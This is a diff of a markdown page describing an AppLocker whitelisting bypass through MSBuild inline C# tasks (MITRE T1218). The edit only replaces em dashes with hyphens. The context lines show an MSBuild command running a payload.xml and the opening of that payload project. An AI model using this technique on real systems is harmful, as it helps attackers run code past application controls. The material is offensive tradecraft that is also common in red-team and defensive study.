@@ -2,7 +2,7 @@
 
 Bypass application whitelisting to execute arbitrary code.
 
-**MITRE ATT&CK**: T1218 — System Binary Proxy Execution
+**MITRE ATT&CK**: T1218 - System Binary Proxy Execution
 
 ## Check AppLocker Status
 
@@ -20,7 +20,7 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml
 ```
 
 ```xml
-<!-- payload.xml — inline C# task execution -->
+<!-- payload.xml - inline C# task execution -->
 <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
   <Target Name="Exec">
     <ClassExample />
